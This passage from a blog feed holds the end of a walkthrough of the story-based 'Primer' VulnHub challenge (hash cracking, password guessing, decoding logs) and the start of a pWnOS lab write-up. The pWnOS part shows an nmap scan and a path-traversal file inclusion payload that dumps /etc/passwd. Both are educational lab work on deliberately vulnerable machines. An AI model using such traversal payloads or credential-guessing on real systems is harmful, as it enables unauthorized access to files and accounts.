</span><span class='line'>  'substring',
</span><span class='line'>  'charCodeAt',
</span><span class='line'>  'split',
</span><span class='line'>  '0123456789abcdef',
</span><span class='line'>  'join',
</span><span class='line'>  'hello',
</span><span class='line'>  '5d41402abc4b2a76b9719d911017c592',
</span><span class='line'>  '0d28cba0bd4f26e16d766000d27e49fa',
</span><span class='line'>  '§#/$',
</span><span class='line'>  'location',
</span><span class='line'>  './_.php',
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>I cracked those MD5 hashes, first is <em>hello</em> and second is <em>GOD</em>&hellip;so let&rsquo;s say hello in the input box! I tried &ldquo;helloGOD&rdquo; but that just got me to another scary red page. Entering just &ldquo;GOD&rdquo; worked though!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level8b.png" title="primer level 8" alt="primer level 8"></p>

<p>If you glanced at the URL formats beginning at the second challenge, you probably noticed they begin with a number for the level, that keeps going up as you progress (1,2,3 etc.), an underscore, and then what looks like an MD5 hash! I copied all of them to an online cracking site, and here is the pattern:</p>

<p>1st node = 2</p>

<p>2nd = 3</p>

<p>3rd = 5</p>

<p>4th = 7</p>

<p>5th = 11</p>

<p>6th = 13</p>

<p>7th = 17</p>

<p>Following this, I surmised that the next one would be 19, because from the order it appears that next increase should be by 2. The order being: <code>1st to 2nd: +1 &ndash;> 2nd to 3rd: +2 &ndash;> 3rd to 4th: +2 &ndash;> 4th to 5th: +4 &ndash;> 5th to 6th: +2 &ndash;> 6th to 7th: +4</code>. So I constructed the URL for the next level with the hashed value of 19, like this: <code>8_1f0e3dad99908345f7439f8ffabdffc4/</code>.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level9.png" title="primer level 9" alt="primer level 9"></p>

<p>By now we know enough to click on the big EOF link :D</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level10.png" title="primer level 10" alt="primer level 10"></p>

<p>What&rsquo;s this? It looks like a terminal prompt. I entered <em>whoami</em> in it:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_end.png" title="primer end" alt="primer complete"></p>

<p>Hmmm, scary :D I tried some other other commands too:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_cli.png" title="primer cli" alt="primer cli"></p>

<p>There is a help command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>help
</span><span class='line'>[0]================================================================
</span><span class='line'> 
</span><span class='line'>ls [dir]
</span><span class='line'> 
</span><span class='line'>outputs contents of [dir]
</span><span class='line'>prints contents of current directory if no [dir] is specified
</span><span class='line'> 
</span><span class='line'>[1]================================================================
</span><span class='line'> 
</span><span class='line'>cd [dir]
</span><span class='line'> 
</span><span class='line'>changes the current directory to [dir]
</span><span class='line'>outputs current directory if no directory is specified
</span><span class='line'> 
</span><span class='line'>[2]================================================================
</span><span class='line'> 
</span><span class='line'>cat [file]
</span><span class='line'> 
</span><span class='line'>displays the content of [file]
</span><span class='line'> 
</span><span class='line'>[3]================================================================
</span><span class='line'> 
</span><span class='line'>ps
</span><span class='line'> 
</span><span class='line'>displays a list of running processes
</span><span class='line'> 
</span><span class='line'>[4]================================================================
</span><span class='line'> 
</span><span class='line'>whoami
</span><span class='line'> 
</span><span class='line'>displays username
</span><span class='line'> 
</span><span class='line'>[5]================================================================
</span><span class='line'> 
</span><span class='line'>clear
</span><span class='line'> 
</span><span class='line'>deletes terminal command history
</span><span class='line'> 
</span><span class='line'>[6]================================================================
</span><span class='line'> 
</span><span class='line'>connect [user]@[host]
</span><span class='line'> 
</span><span class='line'>connects to a remote host using the credentials of user
</span><span class='line'> 
</span><span class='line'>[7]================================================================
</span><span class='line'> 
</span><span class='line'>hash [type] [file|string]
</span><span class='line'> 
</span><span class='line'>prints the hash of a file or "string"
</span><span class='line'>supported hash functions are: 
</span><span class='line'>md5, sha256, sha1, whirlpool and crc32
</span><span class='line'> 
</span><span class='line'>[8]================================================================
</span><span class='line'> 
</span><span class='line'>encode|decode [type] [file|string]
</span><span class='line'> 
</span><span class='line'>encodes/decodes the file or "string"
</span><span class='line'>supported encodings are: 
</span><span class='line'>uu, gz, base64 and rot13
</span><span class='line'> 
</span><span class='line'>[9]================================================================
</span><span class='line'> 
</span><span class='line'>enrypt|decrypt [file|string] [key]
</span><span class='line'> 
</span><span class='line'>encrypts/decrypts the file or "string"</span></code></pre></td></tr></table></div></figure>


<p>Next I took a closer look at the AIs&hellip;I meant users! :D</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/chaos.png" title="chaos" alt="chaos"></p>

<p>I thought they were directories but couldn&rsquo;t cd to them. Then I tried cracking the names that look like long hashes of something, but no success. I looked at wintermute next:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/wintermute.png" title="wintermute" alt="wintermute"></p>

<p>Same thing, the hashes didn&rsquo;t yield anything. Next..</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/zephis.png" title="zephis" alt="zephis"></p>

<p>More hashes, more nothing.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/willis.png" title="willis" alt="willis"></p>

<p>Some text files! Let&rsquo;s read them!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat log_0001.txt
</span><span class='line'> 
</span><span class='line'>3rd of July 2028
</span><span class='line'>
</span><span class='line'>Working with Falken is amazing. He has a quick mind and is incredibly well informed on recent developements. I don't get why he left Sosu after setting up the Chaos c0re.
</span><span class='line'>They must have offered him a position.
</span><span class='line'>I'm not complaining here, just wondering because we are the only RnD team with unlimited funding and Falken was put in charge after all those years of absence.
</span><span class='line'>---
</span><span class='line'>cat log_0002.txt
</span><span class='line'> 
</span><span class='line'>8th of August 2028
</span><span class='line'>
</span><span class='line'>Falken didn't show up today. I'm a bit worried because he has been strange lately.
</span><span class='line'>According to the logs he's still logged in...
</span><span class='line'>I haven't informed the admins yet. I don't know why...
</span><span class='line'>---
</span><span class='line'>cat log_0003.txt
</span><span class='line'> 
</span><span class='line'>10th of August 2028
</span><span class='line'>
</span><span class='line'>The guys from the mainland called in today. Said some suits will be here tomorrow.
</span><span class='line'>Apparently the Erebus Core started behaving strangely and the kill-switch didn't fire.
</span><span class='line'>Chaos is still locked down. But I have a weird feeling about all this.
</span><span class='line'>Falken disappearing, the incident with Erebus...</span></code></pre></td></tr></table></div></figure>


<p>Some ominous stuff going down there! Let&rsquo;s check falken:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/falken.png" title="falken" alt="falken"></p>

<p>More logs!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat log_0001.txt
</span><span class='line'> 
</span><span class='line'>12th of Juli 2028
</span><span class='line'>
</span><span class='line'>My work on getting the old core up and running continues to spark doubt among my colleagues. To be fair, no-one has ever attempted to get a corrupted AI back online.
</span><span class='line'>But I am confident that I can isolate the malicious parts and rescue the data lost due the crash last year.
</span><span class='line'>---
</span><span class='line'>cat log_0002.txt
</span><span class='line'> 
</span><span class='line'>6th of August 2028
</span><span class='line'>
</span><span class='line'>I am getting nowhere fast. If we cannot make the recovery until the end of the month the project will be abandoned and the Sosu core locked down.
</span><span class='line'>A frozen BLOB, lost potential. I won't let that happen!
</span><span class='line'>Today was Joshua's birthday. 44 years, time flies. We spent some time in a bar in Shenzen and talked. A nice Father-Son-Momement. I've missed those.
</span><span class='line'>It took my mind of things but now that I'm here at the desk it all comes back.
</span><span class='line'>I might have to make a bold move...</span></code></pre></td></tr></table></div></figure>


<p>Well, clearly something went wrong. Restoring a corrupt AI doesn&rsquo;t sound like the best idea. I&rsquo;m getting more curious about this story! :D I checked the running processes next:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/ps.png" title="ps" alt="ps"></p>

<p>Trying anything with the <em>c0re</em> command gave me an access denied error, but the <em>connect</em> looks interesting! I tried it, but it asked for a password. Damn! At this point, I tried many passwords, trying to glue information from the logs and also tried the previously hinted passwords. It actually took me a long time to score the right one, I had overlooked an easy one! Most of my tries revolved around joshua and something else, but it took me a while to realize I can figure out Joshua&rsquo;s birth date because both his age and the year of the log are given. So 2028 &ndash; 44 = 1984! (no special significance for that, huh :D). So when I tried <code>joshua1984</code>, the screen changed..and we are on Erebus!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/erebus.png" title="erebus" alt="erebus"></p>

<p>The commands are the same as on the previous host, so let&rsquo;s check the users:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /usr
</span><span class='line'>[wintermute] [mccarthy] [falken] </span></code></pre></td></tr></table></div></figure>


<p>More unintelligible hashes in wintermute, mccarthy looks empty, but Falken has left us more logs :D</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls falken
</span><span class='line'>log_0001._ log_0002._ log_0003._ log_0004._ 
</span><span class='line'>
</span><span class='line'>cat log_0001._
</span><span class='line'> 
</span><span class='line'>OXRoIG9mIEF1Z3VzdCAyMDI4CgpJIGhhdmUgam9pbmVkIHRoZSBuZXR3b3JrIGZyb20gaG9tZSBhbmQgY29ubmVjdGVkIHRvIHRoZSBFcmVidXMgc2VydmVyLiBJIHdpbGwgY29udGludWUgbXkgd29yayBmcm9tIGhlcmUgYnV0IEkgd2lsbCBoYXZlIHRvIGJlIG1vcmUgY2FyZWZ1bC4KTm93LCBFcmVidXMgd2FzIHRoZSBzZWNvbmQgQUkgaW5zdGFsbGVkIGFmdGVyIENoYW9zLiBJIHdhc24ndCBwYXJ0IG9mIHRoZSB0ZWFtIGJ1dCBtb3N0IG9mIHRoZSBtZW1iZXJzIHdlcmUgbXkgZnJpZW5kcywgc28gSSBrbm93IG15IHdheSBhcm91bmQgaGVyZS4K</span></code></pre></td></tr></table></div></figure>


<p>Uh-oh, this time it won&rsquo;t be so easy to read them. But it doesn&rsquo;t look as daunting as the ones I couldn&rsquo;t crack..sure enough, it turns out a base64 decode will do the trick! It was faster for me to feed the strings into an online decoder, but you can use the <em>decode</em> command on the server too. Here are the decoded logs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>9th of August 2028 
</span><span class='line'>
</span><span class='line'>I have joined the network from home and connected to the Erebus server. I will continue my work from here but I will have to be more careful. Now, Erebus was the second AI installed after Chaos. I wasn't part of the team but most of the members were my friends, so I know my way around here. 
</span><span class='line'>
</span><span class='line'>10th of August 2028 
</span><span class='line'>
</span><span class='line'>Ok, the problem I have with the Chaos c0re is that it's source is shifting too fast. Every time I execute a small part it breaks down or begins to morph and grow in order to replicate functions of different parts. The signaling is also going crazy even on segments that are relatively stable. Signaling to disconnected parts! And reactions to responses that would have but definitely have not been sent... Am I going crazy or is Chaos experiencing phantom pain?</span></code></pre></td></tr></table></div></figure>


<p>Trying to read the 3rd and 4th logs kicked me out of the terminal or something..after reconnecting, I looked at the running processes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ps
</span><span class='line'>USER     PID    CPU    MEM   COMMAND
</span><span class='line'>root     3251   5.2    3.9    connect falken@TrivialZ3r0
</span><span class='line'>root     2677   33.8   43.8   c0re -t Erebus
</span><span class='line'>nieve    84687  0.8    0.5    ps</span></code></pre></td></tr></table></div></figure>


<p>Cool, let&rsquo;s follow in Falken&rsquo;s footsteps..uhm, connects. I tried, but the password I had wasn&rsquo;t good! After more password guessing, I figured something suspicious is preventing me from reading the last logs. Also, all those decoding commands on the server must have been given for a reason! It&rsquo;s funny, but if I had just used them from the beginning instead of going to external sites, I might have progressed faster. Anyway, only after I verified that I could read the first 2 logs with the <em>decode</em> command, instead of pasting the strings inside to an online decoder, I thought I should try using it for the remaining logs as well. I cycled through the options until the one that hit the jackpot!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>decode gz log_0003._
</span><span class='line'> 
</span><span class='line'>12th of August 2028
</span><span class='line'>
</span><span class='line'>I think they might be on to me and I can only change the encoding so often.
</span><span class='line'>I will have to do something reckless... but not from here, they are already too close</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s Falken messing around that is hindering us..but it seems someone else is after him as well? I tried the same thing with the last log:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>decode gz log_0004._
</span><span class='line'> 
</span><span class='line'>PCH ybnq vapernfrq abgvprnoyl, fbzrguvat vf tbvat gb unccra naq V jvyy abg or nebhaq gb jvgarff... GevivnyM3e0 frrzf gb or dhvrg, qba'g xabj jung'f tbvat ba bire gurer ohg vg pna'g or jbefr guna orvat genprq qbja ol znvaynaq fcbbxf. Svefg V arrq fbzr perqf, gubhtu. Uzz, GevivnyM3e0... gung erzvaqf zr bs fbzrbar, yrg'f whfg ubcr gubfr thlf nera'g zngu trrxf.</span></code></pre></td></tr></table></div></figure>


<p>That looks like ROT13 to me, and thankfully, we can decode it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>decode rot13 "PCH ybnq vapernfrq abgvprnoyl, fbzrguvat vf tbvat gb unccra naq V jvyy abg or nebhaq gb jvgarff... GevivnyM3e0 frrzf gb or dhvrg, qba'g xabj jung'f tbvat ba bire gurer ohg vg pna'g or jbefr guna orvat genprq qbja ol znvaynaq fcbbxf. Svefg V arrq fbzr perqf, gubhtu. Uzz, GevivnyM3e0... gung erzvaqf zr bs fbzrbar, yrg'f whfg ubcr gubfr thlf nera'g zngu trrxf."
</span><span class='line'> 
</span><span class='line'>CPU load increased noticeably, something is going to happen and I will not be around to witness... TrivialZ3r0 seems to be quiet, don't know what's going on over there but it can't be worse than being traced down by mainland spooks. First I need some creds, though. Hmm, TrivialZ3r0... that reminds me of someone, let's just hope those guys aren't math geeks.</span></code></pre></td></tr></table></div></figure>


<p>I followed the hint that Falken left us and googled for &ldquo;trivial zero&rdquo;. This returned info about a Riemann zeta function and I stopped reading after that because..well, it look complicated, and I thought I already had a good candidate for the password :D I tried connecting again, this time gave <em>Riemann</em> as password..new host, new things to do!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/trivialzero.png" title="TrivialZ3r0" alt="trivialzero"></p>

<p>This one is a bit different, instead of a user folder, there is a password folder:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /passwd
</span><span class='line'>falken chaos mccarthy 
</span><span class='line'>
</span><span class='line'>cat falken
</span><span class='line'> 
</span><span class='line'>61ea1974dd974297913b1fa2f0470d26
</span><span class='line'> 
</span><span class='line'>cat chaos
</span><span class='line'> 
</span><span class='line'>85241de03d1254ac40274b02caafcd99
</span><span class='line'> 
</span><span class='line'>cat mccarthy
</span><span class='line'> 
</span><span class='line'>f74bfa0e35e5089a0bb743a893b4c7e3</span></code></pre></td></tr></table></div></figure>


<p>All right, let&rsquo;s get cracking! In the meantime, I looked for where to next:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ps
</span><span class='line'>USER     PID    CPU    MEM   COMMAND
</span><span class='line'>root     3251   4.5    2.9    connect chaos@Wintermute
</span><span class='line'>falken   2005   75.3   73.6   c0re -t Chaos
</span><span class='line'>root     2677   87.1   43.2   c0re -t TrivialZ3r0
</span><span class='line'>nieve    26588  0.5    0.5    ps</span></code></pre></td></tr></table></div></figure>


<p>So it seems we will have to connect as chaos for the next one. I went to <a href="https://hashkiller.co.uk/md5-decrypter.aspx">HashKiller</a> and cracked the hashes as follows: <em>Falken</em>&ndash;<em>Riemann</em> (we already know), <em>Chaos</em>&ndash;<em>2.718281828459045</em> (wouldn&rsquo;t have guessed this one! If you are curious, this is a mathematical constant known as Euler&rsquo;s Number). Couldn&rsquo;t crack McCarthy&rsquo;s. But we have enough to pay Wintermute a visit:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/wintermute_connected.png" title="Wintermute" alt="Wintermute"></p>

<p>Uhm, there are no more breadcrumbs to follow..and why is there a file called nieve in here? Uh-oh..</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/end.png" title="nieve" alt="the end"></p>

<p>An invitation from the AIs! Much better than a squad of hired assassins that would erase all the tracks of this unfortunate hacker..well then, let&rsquo;s see what awaits on the other side!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/credits.png" title="credits" alt="credits"></p>

<p>This was such a great VM, one of my favorites! It required less technical know-how and more detective thinking (or story immersion). I highly recommend it, great storyline and atmosphere! Many thanks to Arne Rick for this unconventional challenge!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Don't hate yourself in the morning -- \
</span><span class='line'>\ sleep till noon.                      /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - pWnOS]]></title>
    <link href="http://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos/"/>
    <updated>2016-02-15T07:08:57-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve decided on a goal for 2016 to pwn as many VulnHub boxes as I can, and train myself to reach a level where I can hopefully take the OSCP. So I scrolled back in the list of VMs to start with the older ones and move towards the newer ones. Today&rsquo;s target is pWnOS v1.0, a vulnerable Linux machine that apparently contains multiple avenues for getting root</p>

<!-- more -->


<h3>Recon</h3>

<p>I fired Nmap as usual, to see what&rsquo;s listening on the box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#nmap -sT -sV 192.168.80.150
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-02-15 07:15 EST
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up, received arp-response (0.00058s latency).
</span><span class='line'>Not shown: 995 closed ports
</span><span class='line'>Reason: 995 conn-refused
</span><span class='line'>PORT      STATE SERVICE     REASON  VERSION
</span><span class='line'>22/tcp    open  ssh         syn-ack OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
</span><span class='line'>80/tcp    open  http        syn-ack Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
</span><span class='line'>139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X (workgroup: MSHOME)
</span><span class='line'>445/tcp   open  netbios-ssn syn-ack Samba smbd 3.X (workgroup: MSHOME)
</span><span class='line'>10000/tcp open  http        syn-ack MiniServ 0.01 (Webmin httpd)
</span><span class='line'>MAC Address: 00:0C:29:5E:18:C9 (VMware)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure>


<p>Next, I looked at the web server, and here&rsquo;s what I saw:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pwnos/welcome.png" title="pwnos" alt="pwnos 1.0"></p>

<p>Clicking next brought me to a not-so-typical help page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pwnos/help.png" title="help" alt="help"></p>

<p>No matter what skill level you choose, you will be taken to a mocking page with the text &ldquo;HAHAHAHA! , for a n00b you REALLY SUCK!&rdquo; (the n00b part comes from what you choose, so it will vary). I played a bit with the URL parameters, and when I modified <code><a href="http://192.168.80.150/index1.php?help=true&amp;connect=true">http://192.168.80.150/index1.php?help=true&amp;connect=true</a></code> to <code>connect=false</code>, the server spit back some PHP errors:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Warning: include(false) [function.include]: failed to open stream: No such file or directory in /var/www/index1.php on line 18
</span><span class='line'>
</span><span class='line'>Warning: include() [function.include]: Failed opening 'false' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/index1.php on line 18</span></code></pre></td></tr></table></div></figure>


<p>Thinking LFI, I tried to read a file from the system: <code>connect=../../../../etc/passwd</code>. No filtering in place!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>dhcp:x:100:101::/nonexistent:/bin/false
</span><span class='line'>syslog:x:101:102::/home/syslog:/bin/false
</span><span class='line'>klog:x:102:103::/home/klog:/bin/false
</span><span class='line'>mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
</span><span class='line'>obama:x:1001:1001::/home/obama:/bin/bash
</span><span class='line'>osama:x:1002:1002::/home/osama:/bin/bash
</span><span class='line'>yomama:x:1003:1003::/home/yomama:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>Cool, it looks like obama, osama and yomama have been busy making accounts on this box!</p>

<p>I looked next at the Webmin server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pwnos/webmin.png" title="webmin" alt="webmin"></p>

<p>Tried logging in with the default credentials <em>root/root</em>, but it didn&rsquo;t work. Time to search for some exploits!</p>

<h3>Getting the /etc/shadow file</h3>

